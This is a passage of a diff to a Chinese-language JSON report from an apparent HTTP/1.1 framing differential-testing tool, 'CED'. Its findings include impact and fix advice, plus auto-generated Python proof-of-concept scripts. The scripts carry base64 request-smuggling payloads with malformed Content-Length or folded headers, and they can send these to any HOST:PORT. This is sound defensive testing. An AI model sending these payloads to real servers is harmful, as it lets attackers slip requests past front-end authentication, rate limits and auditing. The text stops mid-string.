+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 1cfdd820，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_1cfdd820.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_1cfdd820.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = '1cfdd820'\nFRONT = 'ref-cl-first'\nBACK = 'ref-lenient-cl'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogKzMNCg0KYWJjZA==')\nEXPECT = (39, 0, 39)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_1cfdd820.py"
     },
     {
@@ -248,13 +353,28 @@
       "left": "ref-cl-first",
       "right": "ref-loose-headers",
       "axis": "header_syntax",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "移除请求头 `Host: localhost`；移除请求头 ` injected: fold` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-loose-headers** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-loose-headers** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-loose-headers",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 76,
       "sample_len": 56,
@@ -267,7 +387,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 41d4a9a7，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_41d4a9a7.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_41d4a9a7.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = '41d4a9a7'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-headers'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpIb3N0OiBsb2NhbGhvc3QNCiBpbmplY3RlZDogZm9sZA0KDQphYmM=')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 41d4a9a7，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_41d4a9a7.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_41d4a9a7.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = '41d4a9a7'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-headers'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpIb3N0OiBsb2NhbGhvc3QNCiBpbmplY3RlZDogZm9sZA0KDQphYmM=')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_41d4a9a7.py"
     },
     {
@@ -279,13 +399,28 @@
       "left": "ref-cl-first",
       "right": "ref-loose-headers",
       "axis": "header_syntax",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "移除请求头 ` injected: fold` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-loose-headers** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-loose-headers** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-loose-headers",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 76,
       "sample_len": 59,
@@ -298,7 +433,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 ff9e2e44，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_ff9e2e44.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_ff9e2e44.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = 'ff9e2e44'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-headers'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMDMNCiBpbmplY3RlZDogZm9sZA0KDQphYmM=')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 ff9e2e44，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_ff9e2e44.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_ff9e2e44.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = 'ff9e2e44'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-headers'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMDMNCiBpbmplY3RlZDogZm9sZA0KDQphYmM=')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_ff9e2e44.py"
     },
     {
@@ -310,13 +445,28 @@
       "left": "ref-cl-first",
       "right": "ref-loose-headers",
       "axis": "header_syntax",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "移除请求头 ` injected: fold` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-loose-headers** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-loose-headers** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-loose-headers",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 76,
       "sample_len": 59,
@@ -329,7 +479,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 2eedc234，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_2eedc234.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_2eedc234.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = '2eedc234'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-headers'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogIDMNCiBpbmplY3RlZDogZm9sZA0KDQphYmM=')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 2eedc234，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_2eedc234.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_2eedc234.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = '2eedc234'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-headers'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogIDMNCiBpbmplY3RlZDogZm9sZA0KDQphYmM=')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 